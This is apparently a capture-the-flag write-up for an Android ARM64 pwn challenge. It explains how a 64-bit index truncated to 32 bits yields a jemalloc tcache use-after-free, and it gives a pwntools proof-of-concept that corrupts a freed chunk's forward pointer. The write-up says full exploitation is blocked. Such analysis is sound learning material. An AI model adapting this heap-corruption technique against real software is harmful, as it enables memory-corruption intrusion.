# javaanggara-impossible-pwn-challange
javaanggara's Impossible 'part answer'


---

# Android ARM64 Jemalloc Tcache UAF Exploitation — Vulnerability Research

This repository contains my analysis, research notes, and a working **Proof of Concept (PoC)** for the notorious `impossible` Android ARM64 challenge. 

The challenge features a heavily hardened environment designed to block traditional exploitation vectors, making it an excellent case study for advanced heap manipulation techniques and type-casting flaws on modern Android systems.

## 🛡️ Challenge Specifications

* **Architecture:** ARM64 (Android)
* **Protections:** PIE, Full RELRO, Stack Canary, Fortify, Seccomp-BPF (blocking `execve`/`open`), Ptrace Anti-Debug
* **Allocator:** Jemalloc with Tcache enabled
* **Difficulty:** 6.0 / 10

---

## 🔍 Vulnerability Discovery: Integer Overflow to UAF

During static analysis of the binary using Ghidra, a critical logic flaw was discovered in the index validation logic within the main menu loop and individual option handlers.

### 1. The Flawed Check
The application expects an index to track allocated heap objects. In the main validation loop, the user-supplied index is processed as a **64-bit value**, but it is subsequently truncated/cast to a **32-bit integer** (`int` / `uint`) during boundary checks and table indexing.

#### Decompiled Representation (Ghidra):
```c
if (((uint)local_100 < 8) && (*(long *)(&DAT_00109830 + (local_100 & 0xffffffff) * 8) != 0))

2. The Exploit Mechanism

By providing a massive 64-bit integer index that wraps perfectly around the 32-bit boundary — specifically 4294967296 (0x100000000) — we can completely bypass the security bounds:

    (uint)4294967296 truncates the upper bits in a 32-bit context, evaluating exactly to 0.

    The safety condition 0 < 8 passes successfully.

    The program executes operations (Show, Edit) on the target object array using index 0.

Because the Edit and Show functions do not properly verify if an object is still active or has been deleted, this integer overflow grants us a highly stable Use-After-Free (UAF) and a Heap Read/Write Primitive directly through the application menu.
💻 Proof of Concept (PoC)

Below is the Python script utilizing pwntools that triggers the integer overflow, automates a sequence of allocations/deallocations into the Jemalloc tcache, and demonstrates stable control over the heap structures without causing a crash.
Python

from pwn import *
import time

# Target process running via ADB shell on a rooted Android device
p = process(['adb', 'shell', '/data/local/tmp/impossible'])
time.sleep(0.5)

# The magic 64-bit index that overflows to 0
BIG_IDX = b"4294967296" 

log.info("Step 1: Creating heap structures...")
# Allocate two chunks of size 32
p.sendlineafter(b'>', b'2')
p.sendlineafter(b':', b'0')
p.sendlineafter(b':', b'32')
p.sendafter(b':', b'AAAA')

p.sendlineafter(b'>', b'2')
p.sendlineafter(b':', b'1')
p.sendlineafter(b':', b'32')
p.sendafter(b':', b'BBBB')

log.info("Step 2: Triggering deallocation to populate tcache...")
p.sendlineafter(b'>', b'3')
p.sendlineafter(b':', b'1')
p.sendlineafter(b'>', b'3')
p.sendlineafter(b':', b'0')

log.info("Step 3: Executing UAF via Integer Overflow...")
# Modifying a freed chunk using the giant index
p.sendlineafter(b'>', b'5')
p.sendlineafter(b':', BIG_IDX)
p.sendafter(b':', b'EEFFFFGG') # Corrupting the tcache forward pointer

log.info("Step 4: Verifying memory stability...")
p.sendlineafter(b'>', b'4')
p.sendlineafter(b':', BIG_IDX)

# Inspect output
print(p.recvuntil(b'=== EXP', timeout=1).decode('latin-1', errors='ignore'))
p.close()

🚧 Current Status & Hardening Barriers

While the UAF and heap read/write primitives are completely stable via BIG_IDX, full weaponization to execute a payload or leak critical library bases is restricted by the following modern mitigation layers implemented in the environment:

    Full RELRO: The Global Offset Table (.got) is mapped as read-only post-relocation. Standard Tcache Poisoning targets aimed at hijacking function pointers (like free or malloc) result in an immediate segmentation fault upon write attempts.

    Seccomp Sandbox: System calls such as execve and open are entirely restricted via BPF filters, meaning shellcode execution or standard file descriptors allocation are neutralized.

    ASLR: Memory addresses are randomized on each execution. Because /proc/pid/maps access is restricted by modern Android permission models, out-of-bounds pointer calculations must rely entirely on relative data structure distances within the heap chunk layouts.

📝 Conclusion

This challenge demonstrates that even when a binary is completely locked down with modern compile-time protections (Fortify, Full RELRO, Seccomp), a simple logical flaw in type casting (int64 to int32) can break the application's entire state machine, exposing low-level memory management structures to the user.
